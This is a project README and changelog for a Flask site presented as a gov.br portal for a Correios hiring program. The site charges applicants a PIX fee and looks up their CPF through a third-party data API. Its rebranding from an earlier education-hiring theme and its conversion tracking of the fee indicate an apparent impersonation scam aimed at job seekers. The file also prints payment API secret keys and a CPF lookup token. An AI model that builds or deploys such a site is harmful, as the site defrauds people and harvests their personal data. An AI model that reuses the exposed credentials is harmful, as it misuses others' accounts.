# Correios Contrata - Portal Gov.br

## Visão Geral
Portal governamental brasileiro para o programa "Correios Contrata", implementando um sistema completo de inscrição e seleção pública para funcionários dos Correios.

## Stack Tecnológico
- **Backend**: Flask (Python)
- **Frontend**: HTML5, CSS3, Tailwind CSS
- **Banco de dados**: PostgreSQL
- **APIs**: 
  - FOR4 PAYMENTS (PIX)
  - API de CPF (consulta.fontesderenda.blog)
  - ViaCEP

## Características Principais
- Sistema de inscrição multiétapas
- Validação de CPF via API externa
- Pagamento via PIX
- Agendamento de exames psicotécnicos
- Sistema direcionado aos Correios
- Interface responsiva

## Alterações Recentes
**31/07/2025 - Preparação Final para Deploy Heroku (PRONTO PARA PRODUÇÃO)**
- ✅ Todos os arquivos de deploy Heroku verificados e configurados
- ✅ Procfile otimizado: 1 worker, timeout 30s, wsgi:app entry point  
- ✅ requirements.txt limpo e organizado com versões específicas
- ✅ wsgi.py configurado para produção com FLASK_ENV=production
- ✅ .slugignore criado para reduzir tamanho do deploy (exclui arquivos desnecessários)
- ✅ app.json configurado com addons PostgreSQL e variáveis de ambiente
- ✅ heroku.yml sincronizado com Procfile para consistência
- ✅ runtime.txt especifica Python 3.11.10
- ✅ Script deploy_verification.py para validação pré-deploy
- ✅ Aplicação testada: home page (200), wsgi import, banco de dados funcionais
- ✅ Variáveis de ambiente essenciais configuradas (SESSION_SECRET, DATABASE_URL)
- ✅ Sistema robusto de inicialização do banco com populate_database.py

**DEPLOY PRONTO**: A aplicação está 100% preparada para deploy no Heroku

**31/07/2025 - Otimização Máxima de Performance para Heroku (ULTRA-OTIMIZADO)**
- ✅ Procfile otimizado com gunicorn.conf.py: 2 workers, 4 threads, gthread class
- ✅ Critical CSS inline no template base para carregamento instantâneo
- ✅ Tailwind CSS carregado de forma assíncrona após DOMContentLoaded
- ✅ Sistema de prefetch de links no hover para navegação instantânea
- ✅ Service Worker implementado para cache offline de recursos críticos
- ✅ JavaScript de performance com loading states e fast click handling
- ✅ Middleware de compressão e headers otimizados para todas as rotas
- ✅ ProxyFix configurado para Heroku com headers de segurança
- ✅ Cache HTTP inteligente: 30min home, 10min páginas, 5min APIs
- ✅ Lazy loading de imagens automático
- ✅ Sistema de fallback offline com service worker
- ✅ Preload de recursos críticos e conexões DNS otimizadas
- ✅ Pool de conexões PostgreSQL otimizado: 5 workers para produção
- ✅ Memory optimization com worker_tmp_dir em /dev/shm
- ✅ Timeout aumentado para 120s, keep-alive 5s para melhor estabilidade
- ✅ Graceful timeout 30s e preload app habilitado

**31/07/2025 - Correção Completa de Deploy Heroku**
- Simplificado Procfile: 1 worker, timeout 30s para evitar problemas de memória
- Criado wsgi.py dedicado para entrada da aplicação no Heroku
- Configuração de banco otimizada: pool_size=5 em produção vs 10 local
- Sistema robusto de inicialização do banco com fallbacks
- Removido import problemático for4_payments que causava falha
- Criado models.py separado para melhor organização
- Adicionado .slugignore para reduzir tamanho do deploy
- Configurações específicas DEBUG=False para produção
- Health check script para monitoramento
- Tratamento de erro completo para falhas de conexão
- População automática do banco em deploy inicial

**31/07/2025 - Otimização Completa para Deploy Heroku (Anterior)**
- Configurado Procfile otimizado com 3 workers, timeout 120s e preload para melhor performance
- Implementada configuração avançada do PostgreSQL com pool de conexões otimizado
- Corrigida compatibilidade da URL do banco (postgres:// para postgresql://)
- Adicionados arquivos heroku.yml e app.json para deploy automático
- Cache HTTP implementado com diferentes TTLs: 30min página inicial, 5min para APIs
- Sistema de fallback para falhas de banco de dados
- Logs configurados por ambiente (ERROR em produção, WARNING em desenvolvimento)
- Scripts analytics (Clarity/Facebook) carregam após page load para melhor performance
- CSS e JavaScript carregam de forma assíncrona
- Timeouts reduzidos para APIs externas (8s vs 10s anteriormente)
- Headers de cache e compressão otimizados para CDN
- Preconnect adicionado para domínios externos críticos
- Runtime Python fixado em 3.11.10 para consistência

**31/07/2025 - Implementação Completa do Microsoft Clarity e Facebook Pixel**
- Integrado Microsoft Clarity (ID: snb84erm98) em TODO o projeto para rastreamento completo
- Adicionado script Clarity no template base (base.html) para cobertura automática global
- Implementado Clarity em todas as páginas independentes:
  * pagamento_pix.html, pagamento_confirmado.html
  * agendamento_psicotecnico.html, registro_sgte.html
  * confirmacao_agendamento.html
- Sistema de tracking heatmap e gravação de sessão ativo
- Integrado Facebook Pixel (ID: 785028367210803) em todo o projeto
- Configurados eventos de conversão personalizados:
  * PageView: Em todas as páginas automaticamente
  * Lead: Quando usuário inicia processo de inscrição
  * InitiateCheckout: Na página de pagamento PIX
  * AddPaymentInfo: Quando PIX é gerado com sucesso
  * Purchase: Quando pagamento é confirmado (valor: R$ 87,40, moeda: BRL)
- Sistema duplo de analytics: Clarity para UX e Facebook para conversões

**31/07/2025 - Integração Completa da API Nova Era PIX**
- Substituída API FOR4 PAYMENTS pela API Nova Era para pagamentos PIX
- Implementada classe NovaEraAPI em nova_era_api.py com autenticação Basic Auth
- Configuradas credenciais fornecidas: pk_E5SWGB_rZ-mZowMITdSr5w8zhOdY8TDImLhOM-s9gmJPoc9x e sk_uluAT1O9I6FGTQAcXzccr2H_eAQ9IOzYoY_LLDfR8U6Uv2Xb
- Atualizada página /pagamento-pix com geração de QR Code usando biblioteca QRCode.js
- Implementada funcionalidade "copia e cola" para chave PIX
- Testada criação de transações PIX - funcionando corretamente (ID: 499608)
- Rotas /api/gerar-pix e /api/verificar-pagamento atualizadas para Nova Era API
- Adicionado endpoint /teste-pix para validação da integração

**30/07/2025 - Atualização da Página de Resultados de Busca**
- Corrigidos cargos da página /resultados-busca para refletir posições específicas dos Correios
- Substituídos todos os cargos escolares antigos pelos 8 cargos dos Correios do banco de dados
- Atualizados salários conforme valores reais: carteiro, atendente comercial (R$ 2.429,26 - R$ 3.230,88)
- Motorista com faixa salarial diferenciada (R$ 2.800,00 - R$ 3.750,00)
- Supervisor de Agência como cargo de destaque (R$ 3.500,00 - R$ 4.800,00)
- Corrigida carga horária para 44h semanais conforme padrão dos Correios
- Mantidas descrições técnicas precisas para cada função postal

**30/07/2025 - Eliminação Completa de Referências Educacionais**
- Substituída imagem principal pela nova imagem da agência dos Correios
- Removidas TODAS referências a "agente da educação", "PNAE", "educação" e termos relacionados
- Atualizados todos templates HTML com terminologia dos Correios
- Modificados metadados, títulos e descrições para refletir tema dos Correios
- Alterados cargos disponíveis: carteiro, atendente comercial, auxiliar de triagem, etc.
- Atualizado banco de dados com posições específicas dos Correios
- Corrigidas referências em app.py, populate_database.py e for4_payments.py
- Alterado sistema SGTE para SGTC (Sistema de Gestão do Trabalho dos Correios)

**29/07/2025 - Transformação para Tema Correios**
- Alterado foco do projeto de "Agentes da Educação" para "Correios Contrata"
- Atualizados títulos, textos e terminologias em todas as páginas
- Modificados cargos disponíveis para funções dos Correios
- Alteradas referências institucionais para ECT (Empresa Brasileira de Correios e Telégrafos)
- Mantida estrutura técnica e funcionalidades do sistema

**12/07/2025 - Integração API de CPF**
- Implementada integração com API externa para validação de CPF
- Rota `/validar-cpf` configurada no backend
- JavaScript atualizado para consumir API real
- Dados do CPF exibidos na seção "Verificação de Identidade"
- API utilizada: `https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}`

## Estrutura de Arquivos
```
├── app.py                    # Aplicação Flask principal
├── templates/
│   ├── formulario_inscricao.html  # Formulário com integração API
│   ├── confirmacao_agendamento.html
│   └── ...
├── static/
│   ├── css/
│   └── js/
├── for4_payments.py         # Integração PIX
└── models.py               # Modelos de dados
```

## Fluxo de Inscrição
1. Identificação Pessoal (CPF + API)
2. Verificação de Identidade
3. Pagamento PIX
4. Registro SGTE
5. Agendamento Psicotécnico
6. Confirmação Final

## Configuração de Ambiente
### Desenvolvimento
- DATABASE_URL: Conexão PostgreSQL local
- FLASK_ENV: development

### Produção (Heroku)
- DATABASE_URL: PostgreSQL Heroku addon (auto-configurado)
- FLASK_ENV: production
- SESSION_SECRET: Chave secreta Flask (gerada automaticamente)
- TOKEN_CPF_API: Token para validação de CPF
- NOVA_ERA_SECRET_KEY: Chave secreta API Nova Era PIX
- NOVA_ERA_PUBLIC_KEY: Chave pública API Nova Era PIX

### Arquivos de Deploy
- `Procfile`: Configuração Gunicorn otimizada para Heroku
- `runtime.txt`: Python 3.11.10
- `heroku.yml`: Build configuration avançada
- `app.json`: Deploy button e configuração automática

## Estado Atual
- Servidor Flask rodando na porta 5000
- Integração API CPF funcionando
- Frontend responsivo implementado
- Sistema de pagamento PIX configurado

## Próximos Passos
- Testes de integração com API real
- Validação de dados retornados
- Tratamento de erros de conectividade
- Implementação de fallbacks